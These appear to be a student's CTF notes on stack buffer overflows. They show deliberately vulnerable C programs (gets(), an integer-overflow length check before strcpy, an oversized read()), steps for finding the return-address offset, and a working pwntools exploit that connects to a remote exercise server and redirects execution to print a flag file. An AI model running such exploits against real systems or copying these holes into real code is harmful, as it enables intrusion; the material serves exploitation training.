
## Stack

```c
#include #include #include 
int main (int argc , char **argv ) 
{ 
	volatile int modified ; 
	char buffer [64]; 
	modified = 0 ; 
	gets(buffer);  // Get string to buffer => no size check
	
	if (modified != 0 ) { 
		printf ("you have changed 'modified' \n"); // dead code normally
		} 
	else { printf ("Try again? \n"); } }
```

## Example 1

```c
  
static void print_file(const char* def, const char* file)  
{  
    char buf[100];  
    FILE* f;  
    int a = 0xc354;  
  
    f = fopen(file, "r");  
    if (f)  
    {  
        while (fgets(buf, sizeof(buf), f))  
            PRINTF("%s", buf);  
  
        fclose(f);  
    }  
    else  
        PRINTF("%s\n", def);  
}  
  
  
char glb_buf[0x2000] = {0}; // 8192  
  
char *get_data() {  
    if (!fgets(glb_buf, sizeof(glb_buf), stdin)) {  
        return NULL;  
    }  
  
    return glb_buf;  
}  
  
#define BANNER_FILE "banner.txt"  
#define SECURE_PASSWD "APasswordSoSecureItIsImpossibleToFind"  
#define MAX_SIZE 40 //0x28  
#define MIN_SIZE 8  
  
void handle_client(int fd)  
{  
    char buf[MAX_SIZE];  
    char *tmp;  
    char sz; // 1 byte [0,255] 0 FF [8,0x28(40)]  
  
    print_file("Welcome to this secure API", BANNER_FILE);  
  
    PRINTF("Enter password:\n");  
  
    tmp = get_data();  
    sz = strlen(tmp); // if plus than 255 ?  
  
    if (sz < MIN_SIZE || sz > MAX_SIZE) {  
        PRINTF("INVALID PASSWORD\n");  
        return;  
    }  
  
    // our password has a valid size, copy because we will want to call get_data again  
    strcpy(buf, tmp); // with tmp we can get over the buffer ? // call get_data and then strcmp?  
  
    if (!strcmp(buf, SECURE_PASSWD)) { // replace strcmp with print file and there arg ?  
        PRINTF("You are authenticated!\n");  
    }  
    else {  
        PRINTF("Wrong password!\n");  
    }  
  
}
```

Ici, après le int overflow, on peut faire un buffer overflow

### Trouver le padding 

Generate a pattern with : https://wiremask.eu/tools/buffer-overflow-pattern-generator/

Start : ```strace -f ./exo```

```python
buf = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A'  
target.sendline(buf)
```

![[Pasted image 20231117213359.png]]

![[Pasted image 20231117213504.png]]

Then the offset is 57 => acces à esp

On peut overwrite l'addresse de retour de la fonction

@addr of the function we want to call (Look of the addr in IDA if no pie)
@ret de la function (Generalement exit)
@first arg 
@other arg

```python
from pwn import * # CONNECT:  
target = remote("163.172.39.203", 9020) # TCP connection on port 9000  
#target = remote("0.0.0.0", 9000) # TCP connection on port 9000  
# target = process("./exo") # launch exercise exo100  
  
  
buf = b'a' * 57  
#buf += p32(0x80494A9) # get_data  
buf += p32(0x080493F6) # print_file  
buf += p32(0x0804C034) # exit  
buf += p32(0x0804A05C) # 1st arg : on s'en fou  
buf += p32(0x804c1a4) # 2nd arg : end of glb_buf  
  
# Add padding for overflow  
if (len(buf) % 255 < 8):  
    size = 295  
elif (len(buf) % 255 > 40):  
    size = 264-len(buf)  
else:  
    size = 0  
#size = 183  
print("size: %s" % hex(size))  
print("len buf: %s" % hex(len(buf)))  
print("len buf + size: %s" % hex(len(buf)%255 + size) )  
buf += b'b' * (size - 4) # cat for flag  
buf += b'flag\0' # Add flag at the end of the glb_buf  
target.sendline(buf)  
  
print("sending...")  
target.sendline(buf)  
print("recv...")  
  
for i in range (100) :  
    print(target.recvline())
```

![[Pasted image 20240410155324.png]]

To find offset
pattern create 200
take first value of the top of the stack and pattern_offset

\[.]\s.*process.*\n

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vuln() {
        char name_buffer[0x20];
        read(0, name_buffer, 0x1f);
        printf("Hello, %s\n; send me your message now: ", name_buffer);
        fflush(stdout);
        read(0, name_buffer, 0x200);
}

int main() {
        printf("Enter your name: ");
        fflush(stdout);
        vuln();
        return 0;
}
```
